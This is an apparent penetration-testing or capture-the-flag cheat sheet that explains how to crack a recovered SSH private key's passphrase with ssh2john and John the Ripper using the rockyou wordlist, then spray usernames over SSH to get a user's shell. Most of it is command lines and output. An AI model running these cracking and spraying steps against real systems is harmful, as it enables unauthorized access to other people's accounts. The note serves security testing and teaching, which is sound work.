# RSA_IS File
If an RSA_ID file is recovered anytime during a penetration test or capture the flag, you can use [John the Ripper](https://github.com/magnumripper/JohnTheRipper) with a wordlist to attempt to obtain the passphrase.
```
root@attacker-machine:~# ssh2john id_rsa > id_rsa.john
root@attacker-machine:~# john --wordlist=/path/to/rockyou.txt id_rsa.john
password123      (id_rsa)
1g 0:0
```
Then, you can try to use the `id_rsa` file while spraying usernames at the target machine.
```
root@attacker-machine:~# chmod 600 id_rsa
root@attacker:~# chown root id_rsa
root@attacker-machine:~# ssh -i id_rsa -l (USERNAME TO TEST) (TARGET IP) 
```
When asked for the passphrase for `id_rsa` enter the password cracked by John the Ripper and if you have found the correct user during the user spray, you will be dropped to that user's shell on the system.
